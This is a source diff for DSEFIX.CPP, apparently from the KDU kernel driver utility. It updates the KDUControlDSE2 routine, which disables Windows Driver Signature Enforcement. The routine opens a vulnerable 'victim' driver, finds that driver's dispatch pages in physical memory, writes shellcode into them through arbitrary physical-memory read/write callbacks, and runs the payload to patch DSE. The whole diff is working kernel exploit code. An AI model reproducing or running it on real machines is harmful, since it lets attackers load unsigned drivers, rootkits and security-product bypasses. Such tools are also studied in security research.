@@ -1,12 +1,12 @@
 /*******************************************************************************
 *
-*  (C) COPYRIGHT AUTHORS, 2014 - 2022
+*  (C) COPYRIGHT AUTHORS, 2014 - 2023
 *
 *  TITLE:       DSEFIX.CPP
 *
-*  VERSION:     1.28
+*  VERSION:     1.30
 *
-*  DATE:        01 Dec 2022
+*  DATE:        20 Mar 2023
 *
 *  CI DSE corruption related routines.
 *  Based on DSEFix v1.3
@@ -439,6 +439,7 @@ BOOL KDUControlDSE2(
     HANDLE victimDeviceHandle = NULL;
 
     KDU_PHYSMEM_ENUM_PARAMS enumParams;
+    VICTIM_IMAGE_INFORMATION vi;
 
     prov = Context->Provider;
     victimProv = Context->Victim;
@@ -462,7 +463,9 @@ BOOL KDUControlDSE2(
     //
     if (VpCreate(victimProv,
         Context->ModuleBase,
-        &victimDeviceHandle))
+        &victimDeviceHandle, 
+        NULL, 
+        NULL))
     {
         printf_s("[+] Victim is accepted, handle 0x%p\r\n", victimDeviceHandle);
     }
@@ -478,29 +481,51 @@ BOOL KDUControlDSE2(
         (PVOID)Address,
         DSEValue);
 
-    enumParams.bWrite = TRUE;
-    enumParams.ccPagesFound = 0;
-    enumParams.ccPagesModified = 0;
-    enumParams.Context = Context;
-    enumParams.pvPayload = shellBuffer;
-    enumParams.cbPayload = (ULONG)shellSize;
+    RtlSecureZeroMemory(&vi, sizeof(vi));
 
-    supPrintfEvent(kduEventInformation,
-        "[+] Looking for %ws driver dispatch memory pages, please wait\r\n", victimProv->Name);
+    if (!VpQueryInformation(
+        Context->Victim, VictimImageInformation, &vi, sizeof(vi)))
+    {
+        supPrintfEvent(kduEventError,
+            "[!] Could not query victim image information, GetLastError %lu\r\n", GetLastError());
 
-    if (supEnumeratePhysicalMemory(KDUProcExpPagePatchCallback, &enumParams)) {
+    }
+    else {
 
-        printf_s("[+] Number of pages found: %llu, modified: %llu\r\n",
-            enumParams.ccPagesFound,
-            enumParams.ccPagesModified);
+        enumParams.DispatchHandlerOffset = vi.DispatchOffset;
+        enumParams.DispatchHandlerPageOffset = vi.DispatchPageOffset;
+        enumParams.JmpAddress = vi.JumpValue;
+        enumParams.DeviceHandle = Context->DeviceHandle;
+        enumParams.ReadPhysicalMemory = Context->Provider->Callbacks.ReadPhysicalMemory;
+        enumParams.WritePhysicalMemory = Context->Provider->Callbacks.WritePhysicalMemory;
 
-        //
-        // Run shellcode.
-        //
-        VpExecutePayload(victimProv, &victimDeviceHandle);
+        enumParams.DispatchSignature = Context->Victim->Data.DispatchSignature;
+        enumParams.DispatchSignatureLength = Context->Victim->Data.DispatchSignatureLength;
+
+        enumParams.bWrite = TRUE;
+        enumParams.ccPagesFound = 0;
+        enumParams.ccPagesModified = 0;
+        enumParams.pvPayload = shellBuffer;
+        enumParams.cbPayload = (ULONG)shellSize;
 
         supPrintfEvent(kduEventInformation,
-            "[+] DSE patch executed successfully\r\n");
+            "[+] Looking for %ws driver dispatch memory pages, please wait\r\n", victimProv->Name);
+
+        if (supEnumeratePhysicalMemory(KDUPagePatchCallback, &enumParams)) {
+
+            printf_s("[+] Number of pages found: %llu, modified: %llu\r\n",
+                enumParams.ccPagesFound,
+                enumParams.ccPagesModified);
+
+            //
+            // Run shellcode.
+            //
+            VpExecutePayload(victimProv, &victimDeviceHandle);
+
+            supPrintfEvent(kduEventInformation,
+                "[+] DSE patch executed successfully\r\n");
+        }
+
     }
 
     //
